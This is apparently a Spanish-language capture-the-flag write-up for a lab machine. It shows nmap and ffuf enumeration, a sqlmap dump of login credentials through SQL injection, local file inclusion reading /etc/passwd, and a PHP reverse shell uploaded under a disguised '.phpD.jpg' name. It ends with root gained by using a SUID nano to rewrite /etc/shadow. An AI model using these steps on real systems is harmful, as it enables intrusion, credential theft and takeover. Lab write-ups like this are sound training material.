# Introducción

Este reto esta echo para evaluar skills de red team. 

Utilizaremos estas herramientas:

- Nmap
- Sqlmap
- Wordlistt
- PHP Shell

# Enumeración

Test conectividad + SO

```
ping 10.10.173.53
PING 10.10.173.53 (10.10.173.53) 56(84) bytes of data.
64 bytes from 10.10.173.53: icmp_seq=1 ttl=64 time=2.11 ms
64 bytes from 10.10.173.53: icmp_seq=2 ttl=64 time=0.417 ms
^C
--- 10.10.173.53 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 0.417/1.265/2.113/0.848 ms
```

Como podemos ver ttl=64 es un linux

Escaner puertos

```
sudo nmap -sCV -T4 --min-rate 4000 10.10.173.53

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-27 12:00 BST
Nmap scan report for ip-10-10-173-53.eu-west-1.compute.internal (10.10.173.53)
Host is up (0.00045s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.229.254
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.16.1-Ubuntu
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
MAC Address: 02:7F:25:35:DC:2B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.99 seconds
```

Como podemos ver tenemos 3 puertos abiertos

- FTP 21 - con Anonymous activo
- SSH 22
- 53 Parece ser el mismo dominio con 9.16.1 Ubuntu

Me he conectado a dicho puerto 21 con anonymous y no he encontrado completamente nada. con lo cuál pasamos a otro puerto a ver si encontramos algo.

También podríamos hacer otro escaner de puertos mas enfocado en otros puertos UDP o de firewall.

```
sudo nmap -p- --min-rate 4000 10.10.173.53

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-27 12:03 BST
Nmap scan report for ip-10-10-173-53.eu-west-1.compute.internal (10.10.173.53)
Host is up (0.00042s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
1337/tcp open  waste
1883/tcp open  mqtt
MAC Address: 02:7F:25:35:DC:2B (Unknown)
```

Cosa que hemos encontrado

- 1337
- 1883

Vamos a hacer otro escaner centrado en esos dos puertos encontrados

```
sudo nmap -p 1337,1883 -sCV -T4 --min-rate 4000 10.10.173.53

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-27 12:05 BST
Nmap scan report for ip-10-10-173-53.eu-west-1.compute.internal (10.10.173.53)
Host is up (0.00018s latency).

PORT     STATE SERVICE                 VERSION
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: EXPOSED
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/load/messages/received/15min: 0.07
|     $SYS/broker/load/bytes/received/15min: 1.19
|     $SYS/broker/load/connections/15min: 0.07
|     $SYS/broker/load/sockets/5min: 0.20
|     $SYS/broker/load/bytes/sent/15min: 0.27
|     $SYS/broker/load/messages/sent/1min: 0.91
|     $SYS/broker/load/bytes/received/5min: 3.53
|     $SYS/broker/load/sockets/1min: 0.91
|     $SYS/broker/bytes/sent: 4
|     $SYS/broker/store/messages/bytes: 179
|     $SYS/broker/messages/sent: 1
|     $SYS/broker/messages/received: 1
|     $SYS/broker/heap/maximum: 49688
|     $SYS/broker/load/messages/sent/5min: 0.20
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/uptime: 506 seconds
|     $SYS/broker/load/bytes/sent/5min: 0.79
|     $SYS/broker/load/sockets/15min: 0.07
|     $SYS/broker/bytes/received: 18
|     $SYS/broker/load/messages/received/5min: 0.20
|     $SYS/broker/load/connections/5min: 0.20
|     $SYS/broker/load/messages/received/1min: 0.91
|     $SYS/broker/load/bytes/sent/1min: 3.65
|     $SYS/broker/load/messages/sent/15min: 0.07
|     $SYS/broker/load/connections/1min: 0.91
|_    $SYS/broker/load/bytes/received/1min: 16.45
MAC Address: 02:7F:25:35:DC:2B (Unknown)
```

Parece ser que hemos encontrado un http en el puerto 1337 genial

Vemos que en el 1883 encontramos "mosquitto con la versión 1.6.9"

Vamos a enumerar la web a ver si encontramos algo.


![image](https://github.com/user-attachments/assets/a62c6e30-3205-457d-a32f-9a2fcbf586b5)

Vamos a hacer un escáner de directorios a ver si encontramos algo porque en el código fuente no encontramos nada

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.173.53:1337/FUZZ
javascript
phpmyadmin
admin
admin_101
```

![image](https://github.com/user-attachments/assets/f9f39367-2836-482a-bbf9-0ed69eb196dd)

Hemos encontrado un logeo en la base de datos de phpmyadmin, lo primero que podemos hacer es probar las credenciales por default de phpmyadmin 

He probado la por default y nada vamos a probar otro directorio como admin_101

![image](https://github.com/user-attachments/assets/61c51bee-5575-4104-9026-c1189e20acbd)

Vaya parece ser que tenemos un email puesto ya

"hacker@root.thm"

Jugando un poco tiene toda la pinta de haber un SQL Injection Vamos a hacer pruebas con SqlMap

Coguemos la request de burp para el post

```
cat request 
POST /admin_101/includes/user_login.php HTTP/1.1
Host: 10.10.173.53:1337
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 37
Origin: http://10.10.173.53:1337
Connection: close
Referer: http://10.10.173.53:1337/admin_101/
Cookie: PHPSESSID=olsjcph1jraqlnncm1n6c8nfaf

email=hacker%40root.thm&password=asdf
```

Vamos a hacer el sql map

```
sqlmap -r request --dump
```
```
Database: expose
Table: user
[4 entries]
+--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+
| id                                   | email                                | created                              | password                             |
+--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+
| 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  |
| hacker@root.thm                      | hacker@root.thm                      | hacker@root.thm                      | hacker@root.thm                      |
| 1                                    | 1                                    | 1                                    | 1                                    |
| VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 |
+--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+
```

Nos metemos a la web que encontramos ahora

![image](https://github.com/user-attachments/assets/d93bc49c-9bda-47df-b153-3bf5d485129d)

```
Database: expose                                                               
Table: config
[2 entries]
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
+----+------------------------------+-----------------------------------------------------+
```

Tambien encontramos esto, vamos a ver si hay algo interesante, nos pide una password cosa que la hemos sacado

![image](https://github.com/user-attachments/assets/fb41f199-f40b-4712-9c21-19089fea8236)

Parece que nos esta retando.

El mismo código fuente nos da una pista: Hint: Try file or view as GET parameters?

Por arte de magia me ha dado por probar una LFI y ha salido jaja

![image](https://github.com/user-attachments/assets/07cfde73-e4c2-494f-8fe2-77d95d149df2)

Con esto podemos hacer cositas como un rev shell o leer directamente archivos que veamos importantes o sacar las ssh 

Ya que estamos también vamos a ver la otra ruta que teniamos ya que sabemos todos los usuarios ahora mismo y sabemos que empieza por Z con lo cu´´al no va aser muy complicado encontrarlo.

zeamkish:x:1001:1001:Zeam Kish

![image](https://github.com/user-attachments/assets/86d41553-0814-44db-abad-853d2ebe831b)

Estamos dentro y parece que con acceso de admin

El mismo código fuente nos dice que solo nos va a dejar meter JPG o PNG con lo cuál tendremos que probar cositas

Cogemos la PHP de pentestmonkey

Ahora vamos a tener que hacer un bypass de php a jpg el nombre que vamos a usar por ejemplo sera "shell.phpD.jpg"

Una vez lo tengamos creado con la rev shell lo subimos, pero antes de subirlo capturamos la request con burp suite

![image](https://github.com/user-attachments/assets/75829c2f-9be8-4e37-9c12-397d77ba1d7b)

![image](https://github.com/user-attachments/assets/8fe85387-faa6-4e02-a0e2-97760c39868e)

Y lo enviamos, vamos a ver si se ha subido

Genial 

![image](https://github.com/user-attachments/assets/74864f3b-a19d-499d-92fa-22c1b2b6926d)

Ahora simplemente abrimos una escucha por el puerto en cuestion "9001" creo y ejecutamos la shell

![image](https://github.com/user-attachments/assets/6ddd3135-7451-4c1b-9809-e7d3602e26fc)

Estamos dentro ya podemos sacar la primera flag y tirar para subir o escalar privilegios

De hecho lo que recomendaria es upgradear la shell

```
SHELL=/bin/bash script -q /dev/null

STRG+Z

stty raw -echo && fg
```
Maravilloso en /home/zeamkish no podemos abrir la flag.txt pero si sus credenciales.
```
cat ssh_creds.txt
cat ssh_creds.txt
SSH CREDS
zeamkish
easytohack@123
```

Vamos a probar a conectarnos a ver

![image](https://github.com/user-attachments/assets/92210ff7-2e64-4476-8805-9046fd09e84d)

Estamos dentro

# Escala de privilegios

Esto es muy interesante, primero de todo vamos a buscar los servicios que se pueden utilizar

```
find / -perm -04000 -type f -ls 2>/dev/null
```

Nos encontramos con el servicio /usr/bin/nano sabiendo esto podemos llegar a cambiar el /etc/passwd 

Simplemente generamos una clave para el password

```
openssl passwd -1 -salt root 1234
$1$root$.fAWE/htZAqQge.bvM16O/
```

Posteriormente nos vamos con nano /etc/shadow y la cambiamos por esa que nos ha generado

```
su root
1234
```
GG somos root

![image](https://github.com/user-attachments/assets/cba9dbfb-a7a2-4843-85f6-f227a3ca35eb)













